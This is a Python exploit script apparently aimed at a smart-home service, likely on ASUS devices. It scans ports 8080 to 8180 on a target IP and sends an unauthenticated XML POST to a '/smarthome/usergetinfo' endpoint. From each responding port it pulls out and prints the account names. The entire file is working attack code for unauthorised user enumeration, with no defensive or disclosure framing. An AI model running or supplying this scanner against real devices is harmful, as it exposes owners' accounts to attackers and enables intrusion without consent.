#!/usr/bin/env python3
import socket
import requests
import xml.etree.ElementTree as ET

class SmartHomeExploit():
    @staticmethod 
    def getUsers(target):
        """ get all user from target
        Args:
            target (str): target ip and port (e.g. "192.168.0.1:8080")
        
        Returns:
            bool: True => exploitable, False => not exploitable
            list: user list
        """
        try:
            target_url = "http://%s/smarthome/usergetinfo" % (target)
            response = requests.post(target_url,data="<a></a>",timeout=5)
            root = ET.fromstring(response.text)
            if root.tag == "usergetinfo":
                return True,list(map(lambda x:x.text,root.findall("userinfo/asusaccount")))
        except Exception as e:
            return False,[]
        return False,[]
    

    @staticmethod 
    def scanVulPort(target, v=False):
        """ scan exploitable port(8080-8181)
        Args:
            target (str)  : target ip (e.g. "192.168.0.1")
            verbose (bool): show verbose
        
        Returns:
            int: exploitable port (-1 => not exploitable)
        """
        for port in range(8080,8080+101):  
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex((target, port))
                if result == 0: 
                    if v: print("[INFO] Open port : %d" % (port))
                    e, users= SmartHomeExploit.getUsers("%s:%s" % (target,port))
                    if e:
                        if v:
                            print("[INFO] ---------------------------")
                            print("[INFO]   # List account #")
                            for account in users:
                                print("         * " + account)
                            print("[INFO] ---------------------------\n")
                        return port
                    else:
                        if v: print("       > Not exploitable\n")

                sock.close()
            except Exception as e:
                print("[ERROR]: scan error")
        return -1


